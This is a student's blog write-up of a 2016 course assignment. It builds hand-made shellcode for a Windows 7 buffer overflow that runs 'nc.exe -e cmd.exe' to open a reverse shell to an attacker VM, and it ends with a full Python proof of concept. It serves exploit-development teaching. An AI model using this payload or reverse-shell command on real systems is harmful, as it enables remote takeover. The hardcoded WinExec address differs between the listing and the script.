---
layout: post
title:  "An Exploit"
date:   2016-09-26  
comments:   true  
---

# Assignment 2, An Exploit

[TOC]

> You must develop and provide your ownshellcode to gain command line (DOS) access using a vulnerability you found from lab 1. Using tools to generate sehllcode or downloaded shellcode without detailed explanation of how the shellcode works is not acceptable. There are different options, for varying degrees of credit.

I've done some research on the internet before this assignment. Almost every blog/tutorial was based on that windows tcp bind 4444 shellcode. Since we are not allowed to copy shellcode from the internet, I would not choose *Option 2*. And because this task is too machine/os specified, packaging it into Metasploit is unnecessary(actually is I was left behind and had no time to learn ruby development). So I chose *Option 1*. Which is using static address and assuming `nc.exe` in the target machine at a known location. I devided the whole assignment into 2 section, address padding and shellcode. It comes below.

### 1. Address Padding

My idea is pretty straightforward. Place the shellcode at the beginning of the input. After shellcode padding "A"s until EIP. And place the beginning address of input in EIP to jump to shellcode and execute. The beginning address of input is already found in Assignment 1 which is `0012F908` . So, the input would be like:

```
shellcode + paddings + "\x08\xF9\x12\x00" + others
```

The "badcharacter" `\x00` is at the end of our "important stuff",  so we don't need to worry about that.



### 2. Shellcode

Our task is to execute `nc.exe` at target machine. So, I choose to use an API call named WinExec in kernel32.dll. Which is described as:

> Runs the specified application.
>
> ```c++
> UINT WINAPI WinExec(
>   _In_ LPCSTR lpCmdLine,
>   _In_ UINT   uCmdShow
> );
> ```

However Windows 7 has [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization), I asume that API calls in kernel32.dll would not be affected by it. Because kernel32.dll has already been loaded before our experiments.  And by using `arwin.exe` we can find the pointer to WinExec:

![](http://ww1.sinaimg.cn/large/006y8lVagw1f8b3y9b2f5j313k06dadv.jpg)

Next, we need to encode our command into hex opcode. The command I used is:

```
C:\\Users\kaidi\Desktop\HW1\nc.exe -e cmd.exe 172.16.32.136 9999
```

`172.16.32.136` is the IP address of another VM which host a kali linux. In kali, I'll open a terminal with:

```
nc -lvp 9999
```

To encode the command string, I just simply use a ASCII to HEX tool online. And split the text into groups of 4 characters. After that, reverse the order of groups. Beside, we have to add `\x68`, which means `push` , in the front of each group as we are inputting characters. And we got:

```
"\x68\x39\x39\x39\x39"
"\x68\x31\x33\x36\x20"
"\x68\x2e\x33\x32\x2e"
"\x68\x32\x2e\x31\x36"
"\x68\x65\x20\x31\x37"
"\x68\x64\x2e\x65\x78"
"\x68\x65\x20\x63\x6d"
"\x68\x78\x65\x20\x2d"
"\x68\x6e\x63\x2e\x65"
"\x68\x57\x31\x5c\x5c"
"\x68\x70\x5c\x5c\x48"
"\x68\x73\x6b\x74\x6f"
"\x68\x5c\x5c\x44\x65"
"\x68\x61\x69\x64\x69"
"\x68\x73\x5c\x5c\x6b"
"\x68\x55\x73\x65\x72"
"\x68\x43\x3a\x5c\x5c"
```

Luckily, my command can be 4-character aligned. If they are not, you can simply add an extra space at the end.

My shellcode idea is also straightforward. 

```asm
XOR EAX,EAX          	|  Zero out EAX register
PUSH EAX             	|  Push EAX to have null-byte padding for "calc.exe"										
PUSH "C:\\Users\kaidi\Desktop\HW1\nc.exe -e cmd.exe 172.16.32.136 9999"												|  Push The ASCII string to the stack
MOV EAX,ESP          	|  Put a pointer to the ASCII string in EAX
PUSH 1               	|  Push uCmdShow parameter to the stack
PUSH EAX             	|  Push the pointer to lpCmdLine to the stack
MOV EBX,7C862AED     	|  Move the pointer to WinExec() into EBX
CALL EBX             	|  Call WinExec()

```

 

### Future Work

1. Our shellcode is executed at the target machine. In the future we can modified it to execute at a remote machine. Which would not be very hard, just use `nc.exe` to do the remote input should be fine. Using python script in this experiment only because it's easy to modify and convenient to use. 
2. Change the behavior of reverse shell. Make it general. No need to specify a static IP address. 

### Difficulties

- I was trying to find the address of `jmp esp` or `call esp` in the progrom to place it in EIP so I can execute my shellcode at ESP. But we are using Windows 7, there's no these kind of calls in Windows 7. If it has, they would be randomized address which can't not be used in our experiment.
- Have to pay attention of badcharacters like `\x00` . It would cause the end of line in your command.



### POC:

```Python
import sys, socket, time
 
host = sys.argv[1]
port = int(sys.argv[2])
 
length = 412

WinExec = (
"\x33\xc0"
"\x50"
"\x68\x39\x39\x39\x39"
"\x68\x31\x33\x36\x20"
"\x68\x2e\x33\x32\x2e"
"\x68\x32\x2e\x31\x36"
"\x68\x65\x20\x31\x37"
"\x68\x64\x2e\x65\x78"
"\x68\x65\x20\x63\x6d"
"\x68\x78\x65\x20\x2d"
"\x68\x6e\x63\x2e\x65"
"\x68\x57\x31\x5c\x5c"
"\x68\x70\x5c\x5c\x48"
"\x68\x73\x6b\x74\x6f"
"\x68\x5c\x5c\x44\x65"
"\x68\x61\x69\x64\x69"
"\x68\x73\x5c\x5c\x6b"
"\x68\x55\x73\x65\x72"
"\x68\x43\x3a\x5c\x5c"
"\x8B\xC4"
"\x6A\x01"
"\x50"
"\xBB\xFD\xE5\x1B\x76"
"\xFF\xD3")

while (length < 1000):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	data1 = s.recv(1024)
	s.sendall(WinExec + "A" * (length-len(WinExec)) + "\x08\xF9\x12\x00" + "C" * 2 + "D" * 10)
	data2 = s.recv(1024)
	s.close()
	time.sleep(2)
	print 'Recieved: ', repr(data1), repr(data2)
	length += 100
```



In the end, we first listen port 9999 at our kali VM. And we run the python script at the target machine.  

![](http://ww4.sinaimg.cn/large/006y8lVagw1f8b402b8nvj313c0g6n1j.jpg)

As we can see here, EIP address successfully points to the beginning of input which is `0012F908`. You probably noticed that value in EIP is not exactly matched with it in the stack. However, it worked. :D

![](http://ww1.sinaimg.cn/large/006y8lVagw1f8b3zgc5ybj30lu0i641u.jpg)

If we succeed, we can see the reverse shell running and the exploit worked.

![](http://ww2.sinaimg.cn/large/006y8lVagw1f8b403kxusj314w0r8q9a.jpg)

### Reference

> http://www.fuzzysecurity.com/tutorials/expDev/6.html
>
> http://morgawr.github.io/hacking/2014/03/29/shellcode-to-reverse-bind-with-netcat/
>
> http://buffered.io/posts/myftpd-exploit-on-windows-7/

